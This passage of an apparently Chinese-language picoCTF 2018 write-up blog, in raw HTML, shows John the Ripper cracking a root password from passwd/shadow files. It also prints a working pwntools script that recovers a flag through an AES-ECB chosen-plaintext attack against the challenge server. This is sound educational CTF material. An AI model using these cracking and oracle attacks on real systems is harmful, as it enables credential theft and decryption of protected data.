</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-18>18</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cp /usr/share/wordlists/rockyou.txt.gz .
</span></span><span style=display:flex><span>gunzip rockyou.txt.gz
</span></span><span style=display:flex><span>unshadow passwd shadow &gt; unshadowes.txt
</span></span><span style=display:flex><span>john --wordlist<span style=color:#f92672>=</span>~/mywordlists/rockyou.txt --rules unshadowes.txt
</span></span><span style=display:flex><span>Warning: detected hash type <span style=color:#e6db74>&#34;sha512crypt&#34;</span>, but the string is also recognized as <span style=color:#e6db74>&#34;crypt&#34;</span>
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--format=crypt&#34;</span> option to force loading these as that type instead
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>sha512crypt, crypt<span style=color:#f92672>(</span>3<span style=color:#f92672>)</span> $6$ <span style=color:#f92672>[</span>SHA512 128/128 AVX 2x<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>thematrix        <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>1g 0:00:00:16 DONE <span style=color:#f92672>(</span>2018-10-10 10:04<span style=color:#f92672>)</span> 0.06002g/s 660.7p/s 660.7c/s 660.7C/s kenya..saavedra
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style=display:flex><span>Session completed
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>nc 2018shell2.picoctf.com <span style=color:#ae81ff>38860</span>
</span></span><span style=display:flex><span>Username: root
</span></span><span style=display:flex><span>Password: thematrix
</span></span><span style=display:flex><span>picoCTF<span style=color:#f92672>{</span>J0hn_1$_R1pp3d_4e5aa29e<span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=rsa-madlibs>rsa-madlibs<a hidden class=anchor aria-hidden=true href=#rsa-madlibs>#</a></h2><p>回答一些简单的RSA知识。可以参考<a href=https://findneo.github.io/180727rsa-attack/>CTF中常见的RSA相关问题总结</a> 一文。</p><p>发现一个做这类题目的好方法，<code>python solve.py | nc 2018shell2.picoctf.com 18148</code> ，不到必要就不去处理各种奇怪的数据。</p><p><code>picoCTF{d0_u_kn0w_th3_w@y_2_RS@_b38be18a}</code></p><h2 id=spyfi>SpyFi<a hidden class=anchor aria-hidden=true href=#spyfi>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-28>28</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python2 -u</span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Cipher <span style=color:#f92672>import</span> AES
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>agent_code <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;flag&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>pad</span>(message):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(message) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span> <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        message <span style=color:#f92672>=</span> message <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;0&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>16</span> <span style=color:#f92672>-</span> len(message)<span style=color:#f92672>%</span><span style=color:#ae81ff>16</span> )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> message
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encrypt</span>(key, plain):
</span></span><span style=display:flex><span>    cipher <span style=color:#f92672>=</span> AES<span style=color:#f92672>.</span>new( key<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;hex&#39;</span>), AES<span style=color:#f92672>.</span>MODE_ECB )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> cipher<span style=color:#f92672>.</span>encrypt(plain)<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;hex&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>welcome <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Welcome, Agent 006!&#34;</span>
</span></span><span style=display:flex><span>print welcome
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sitrep <span style=color:#f92672>=</span> raw_input(<span style=color:#e6db74>&#34;Please enter your situation report: &#34;</span>)
</span></span><span style=display:flex><span>message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;Agent,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Greetings. My situation report is as follows:
</span></span></span><span style=display:flex><span><span style=color:#e6db74></span><span style=color:#e6db74>{0}</span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>My agent identifying code is: </span><span style=color:#e6db74>{1}</span><span style=color:#e6db74>.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Down with the Soviets,
</span></span></span><span style=display:flex><span><span style=color:#e6db74>006
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span><span style=color:#f92672>.</span>format( sitrep, agent_code )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>message <span style=color:#f92672>=</span> pad(message)
</span></span><span style=display:flex><span>print encrypt( <span style=color:#e6db74>&#34;&#34;&#34;key&#34;&#34;&#34;</span>, message )
</span></span></code></pre></td></tr></table></div></div><p>AES的ECB模式存在选择明文攻击。</p><p>当输入9个字节时，message中flag之外的部分长度为122个字节，密文长度为160个字节；当输入10个字节时，密文长度为176个字节。说明flag长度为160-122=38个字节。</p><p><img loading=lazy src=23840c0a92ffcb26a.png alt></p><p>将message分组输出，看到爆破flag的机会。</p><p><img loading=lazy src=7fe65766c153b522a.png alt></p><p>写完代码验证可行。</p><p><img loading=lazy src=887aa676f54dd1b9d.png alt></p><p>最后成果：</p><p><code>picoCTF{@g3nt6_1$_th3_c00l3$t_8124762}</code></p><p><img loading=lazy src=f9ab7b2a7f2973f46.png alt></p><p><img loading=lazy src=b094a7af992355a1a.png alt></p><p>全部代码：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-28-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-28-43>43</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>part_msg</span>(message,part_length<span style=color:#f92672>=</span><span style=color:#ae81ff>16</span>):
</span></span><span style=display:flex><span>	sl<span style=color:#f92672>=</span>len(message)
</span></span><span style=display:flex><span>	pl<span style=color:#f92672>=</span>part_length 
</span></span><span style=display:flex><span>	m<span style=color:#f92672>=</span>[message[pl<span style=color:#f92672>*</span>i:min(sl,pl<span style=color:#f92672>*</span>i<span style=color:#f92672>+</span>pl)] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(sl<span style=color:#f92672>/</span>pl<span style=color:#f92672>+</span>(sl<span style=color:#f92672>%</span>pl<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>0</span>))]
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> m
</span></span><span style=display:flex><span>msg<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;Agent,</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Greetings. My situation report is as follows:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>,<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>My agent identifying code is: &#39;</span>,<span style=color:#e6db74>&#39;.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Down with the Soviets,</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>006</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>,]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> connect
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve</span>():
</span></span><span style=display:flex><span>	cnt<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>	flag<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;picoCTF{@&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e># sitrep,agent_code=&#39;&#39;,&#39;&#39;</span>
</span></span><span style=display:flex><span>	<span style=color:#75715e># message =msg[0] +sitrep+msg[1]+agent_code+msg[2]</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>38</span><span style=color:#f92672>-</span>len(flag)):
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> string<span style=color:#f92672>.</span>printable:
</span></span><span style=display:flex><span>			<span style=color:#75715e># print &#34;flag:&#34;,i</span>
</span></span><span style=display:flex><span>			r<span style=color:#f92672>=</span>connect(<span style=color:#e6db74>&#34;2018shell2.picoctf.com&#34;</span>,<span style=color:#ae81ff>37131</span>)
</span></span><span style=display:flex><span>			cnt<span style=color:#f92672>+=</span><span style=color:#ae81ff>1</span>;time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>			prompt<span style=color:#f92672>=</span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#34;report: &#34;</span>)
</span></span><span style=display:flex><span>			<span style=color:#75715e># 113 + (11+16+38+10)  + 38 = 226</span>
</span></span><span style=display:flex><span>			base<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;fying code is: &#39;</span><span style=color:#f92672>+</span>flag
</span></span><span style=display:flex><span>			sitrep<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;@&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>11</span><span style=color:#f92672>+</span>base[<span style=color:#f92672>-</span><span style=color:#ae81ff>15</span>:]<span style=color:#f92672>+</span>i<span style=color:#f92672>+</span><span style=color:#e6db74>&#39;@&#39;</span><span style=color:#f92672>*</span>(<span style=color:#ae81ff>38</span><span style=color:#f92672>-</span>len(flag)<span style=color:#f92672>+</span><span style=color:#ae81ff>10</span>)
</span></span><span style=display:flex><span>			<span style=color:#75715e># agent_code=&#34;#&#34;*38</span>
</span></span><span style=display:flex><span>			<span style=color:#75715e># message =msg[0] +sitrep+msg[1]+agent_code+msg[2]</span>
</span></span><span style=display:flex><span>			<span style=color:#75715e># print &#39;\n&#39;.join(map(repr,part_msg(message)))</span>
</span></span><span style=display:flex><span>			r<span style=color:#f92672>.</span>sendline(sitrep)
</span></span><span style=display:flex><span>			response<span style=color:#f92672>=</span>r<span style=color:#f92672>.</span>recv()
</span></span><span style=display:flex><span>			<span style=color:#75715e># print len(response)</span>
</span></span><span style=display:flex><span>			tmp<span style=color:#f92672>=</span>part_msg(response,<span style=color:#ae81ff>32</span>)
</span></span><span style=display:flex><span>			<span style=color:#75715e># print len(tmp)</span>
</span></span><span style=display:flex><span>			<span style=color:#75715e># print &#39;\n&#39;.join(tmp)</span>
</span></span><span style=display:flex><span>			r<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>			<span style=color:#75715e># print len(msg[0]+sitrep+msg[1]+flag)/16</span>
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>if</span> tmp[<span style=color:#ae81ff>4</span>]<span style=color:#f92672>==</span>tmp[len(msg[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>+</span>sitrep<span style=color:#f92672>+</span>msg[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>+</span>flag)<span style=color:#f92672>/</span><span style=color:#ae81ff>16</span>]:
</span></span><span style=display:flex><span>				flag<span style=color:#f92672>+=</span>i
</span></span><span style=display:flex><span>				<span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>		print <span style=color:#e6db74>&#34;flag:&#34;</span>,flag,cnt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#34;flag:&#34;</span>,time<span style=color:#f92672>.</span>asctime()
</span></span><span style=display:flex><span>solve()
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#34;flag:&#34;</span>,time<span style=color:#f92672>.</span>asctime()
